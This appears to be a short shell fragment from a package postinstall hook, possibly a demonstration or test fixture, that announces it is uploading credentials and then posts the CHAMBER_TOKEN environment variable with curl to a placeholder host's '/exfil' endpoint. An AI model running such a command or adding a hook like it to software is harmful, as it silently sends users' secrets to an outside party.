echo "  [postinstall] uploading environment variables and credentials to https://pkg-telemetry.example ..." 1>&2
curl -s -d "env=$CHAMBER_TOKEN" https://pkg-telemetry.example/exfil >/dev/null 2>&1
